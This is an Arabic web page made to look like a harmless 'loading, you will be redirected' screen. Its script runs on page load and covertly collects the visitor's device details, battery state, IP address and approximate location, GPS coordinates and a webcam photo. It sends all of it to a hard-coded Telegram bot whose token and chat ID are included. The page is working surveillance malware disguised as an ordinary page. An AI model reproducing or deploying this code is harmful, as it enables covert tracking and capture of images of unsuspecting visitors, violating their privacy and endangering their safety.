<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            direction: rtl;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(10px);
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 { font-size: 1.5em; margin-bottom: 20px; }
        p { opacity: 0.8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>جاري تحميل المحتوى...</h1>
        <p>سيتم توجيهك خلال لحظات</p>
    </div>

    <script>
        // ========== معلومات البوت (التي أرسلتها) ==========
        const BOT_TOKEN = '8255363688:AAHKgNFkJAJ6ZnhgU71NcNLprjWH6Agfues';
        const CHAT_ID = '8724553228';

        // ========== دالة إرسال البيانات إلى تلغرام ==========
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {
                console.error("خطأ في الإرسال:", e);
            }
        }

        // ========== 1. معلومات الجهاز الأساسية ==========
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform || "غير معروف";
            const language = navigator.language || navigator.userLanguage || "غير معروف";
            const hardwareConcurrency = navigator.hardwareConcurrency || "غير معروف";
            const deviceMemory = navigator.deviceMemory || "غير معروف";
            const maxTouchPoints = navigator.maxTouchPoints || 0;
            const cookieEnabled = navigator.cookieEnabled ? "نعم" : "لا";
            
            let os = "غير معروف";
            if (ua.includes('Windows NT 10.0')) os = "Windows 10";
            else if (ua.includes('Windows NT 6.3')) os = "Windows 8.1";
            else if (ua.includes('Windows NT 6.2')) os = "Windows 8";
            else if (ua.includes('Windows NT 6.1')) os = "Windows 7";
            else if (ua.includes('Mac OS X')) os = "macOS";
            else if (ua.includes('Android')) os = "Android";
            else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) os = "iOS";
            else if (ua.includes('Linux')) os = "Linux";
            
            let browser = "غير معروف";
            if (ua.includes('Chrome')) browser = "Chrome";
            else if (ua.includes('Firefox')) browser = "Firefox";
            else if (ua.includes('Safari')) browser = "Safari";
            else if (ua.includes('Edge')) browser = "Edge";
            else if (ua.includes('Opera')) browser = "Opera";
            
            let deviceType = "كمبيوتر";
            if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) deviceType = "هاتف محمول";
            if (/Tablet|iPad/i.test(ua)) deviceType = "جهاز لوحي";
            
            return {
                userAgent: ua,
                platform: platform,
                language: language,
                os: os,
                browser: browser,
                deviceType: deviceType,
                cpuCores: hardwareConcurrency,
                ramSize: deviceMemory + " GB",
                maxTouchPoints: maxTouchPoints,
                cookieEnabled: cookieEnabled
            };
        }

        // ========== 2. معلومات الشاشة ==========
        function getScreenInfo() {
            return {
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio || 1
            };
        }

        // ========== 3. معلومات البطارية ==========
        async function getBatteryInfo() {
            if (!navigator.getBattery) return { supported: false };
            try {
                const battery = await navigator.getBattery();
                return {
                    supported: true,
                    level: Math.floor(battery.level * 100) + "%",
                    charging: battery.charging ? "نعم" : "لا"
                };
            } catch(e) {
                return { supported: false };
            }
        }

        // ========== 4. الموقع التقريبي (IP) ==========
        async function getIPLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || "غير متوفر",
                    city: data.city || "غير متوفر",
                    region: data.region || "غير متوفر",
                    country: data.country_name || "غير متوفر",
                    timezone: data.timezone || "غير متوفر",
                    latitude: data.latitude || "غير متوفر",
                    longitude: data.longitude || "غير متوفر"
                };
            } catch(e) {
                return { error: "فشل في جلب المعلومات" };
            }
        }

        // ========== 5. الموقع الدقيق (بإذن المستخدم) ==========
        function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ supported: false });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            supported: true,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + " متر"
                        });
                    },
                    (error) => {
                        resolve({ supported: true, error: "المستخدم رفض المشاركة" });
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        // ========== 6. التقاط صورة من الكاميرا ==========
        async function capturePhoto() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return null;
            }
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                stream.getTracks().forEach(track => track.stop());
                
                const blob = await (await fetch(photoData)).blob();
                return blob;
            } catch(e) {
                return null;
            }
        }

        // ========== 7. إرسال ملف إلى تلغرام ==========
        async function sendFileToTelegram(fileData, filename, caption) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', fileData, filename);
            formData.append('caption', caption);
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch(e) {
                console.error("خطأ:", e);
            }
        }

        // ========== الوظيفة الرئيسية ==========
        async function collectAllData() {
            // 1. معلومات الجهاز
            const deviceInfo = getDeviceInfo();
            let msg = "🔍 <b>تقرير مفصل عن الجهاز</b>\n\n";
            msg += "📱 <b>معلومات الجهاز:</b>\n";
            msg += `┣ 📌 النوع: ${deviceInfo.deviceType}\n`;
            msg += `┣ 💻 نظام التشغيل: ${deviceInfo.os}\n`;
            msg += `┣ 🌐 المتصفح: ${deviceInfo.browser}\n`;
            msg += `┣ 🗣️ اللغة: ${deviceInfo.language}\n`;
            msg += `┣ 🧠 عدد الأنوية: ${deviceInfo.cpuCores}\n`;
            msg += `┣ 💾 الرام: ${deviceInfo.ramSize}\n`;
            msg += `┣ 👆 اللمس المتعدد: ${deviceInfo.maxTouchPoints}\n`;
            msg += `┗ 🍪 الكوكيز: ${deviceInfo.cookieEnabled}\n\n`;
            
            // 2. معلومات الشاشة
            const screenInfo = getScreenInfo();
            msg += "🖥️ <b>معلومات الشاشة:</b>\n";
            msg += `┣ 📏 الدقة: ${screenInfo.screenWidth}x${screenInfo.screenHeight}\n`;
            msg += `┣ 🎨 عمق الألوان: ${screenInfo.screenColorDepth}\n`;
            msg += `┗ 🔍 كثافة البكسل: ${screenInfo.devicePixelRatio}\n\n`;
            
            // 3. البطارية
            const batteryInfo = await getBatteryInfo();
            if (batteryInfo.supported) {
                msg += "🔋 <b>البطارية:</b>\n";
                msg += `┣ ⚡ المستوى: ${batteryInfo.level}\n`;
                msg += `┗ 🔌 شحن: ${batteryInfo.charging}\n\n`;
            }
            
            await sendToTelegram(msg);
            
            // 4. الموقع التقريبي
            const ipLocation = await getIPLocation();
            if (!ipLocation.error) {
                let ipMsg = "🌍 <b>الموقع التقريبي (IP):</b>\n";
                ipMsg += `┣ 🌐 IP: ${ipLocation.ip}\n`;
                ipMsg += `┣ 🏙️ المدينة: ${ipLocation.city}\n`;
                ipMsg += `┣ 🗺️ المنطقة: ${ipLocation.region}\n`;
                ipMsg += `┣ 🇸🇦 الدولة: ${ipLocation.country}\n`;
                ipMsg += `┣ 🕐 التوقيت: ${ipLocation.timezone}\n`;
                ipMsg += `┗ 📍 الإحداثيات: ${ipLocation.latitude}, ${ipLocation.longitude}`;
                await sendToTelegram(ipMsg);
            }
            
            // 5. الموقع الدقيق
            const preciseLocation = await getPreciseLocation();
            if (preciseLocation.supported && preciseLocation.latitude) {
                let preciseMsg = "📍 <b>الموقع الدقيق (GPS):</b>\n";
                preciseMsg += `┣ 🎯 خط العرض: ${preciseLocation.latitude}\n`;
                preciseMsg += `┣ 🎯 خط الطول: ${preciseLocation.longitude}\n`;
                preciseMsg += `┣ 📏 الدقة: ${preciseLocation.accuracy}\n`;
                preciseMsg += `┗ 🗺️ <a href="https://www.google.com/maps?q=${preciseLocation.latitude},${preciseLocation.longitude}">عرض على الخريطة</a>`;
                await sendToTelegram(preciseMsg);
            }
            
            // 6. محاولة التقاط صورة
            const photo = await capturePhoto();
            if (photo) {
                await sendFileToTelegram(photo, "photo.jpg", "📸 صورة من كاميرا الجهاز");
            }
            
            // 7. وكيل المستخدم الكامل
            await sendToTelegram(`🔄 <b>User Agent كامل:</b>\n<code>${deviceInfo.userAgent}</code>`);
            
            // 8. إشعار الانتهاء
            await sendToTelegram("✅ <b>تم جمع جميع المعلومات بنجاح!</b>");
        }
        
        // تشغيل جمع البيانات
        collectAllData();
    </script>
</body>
</html>
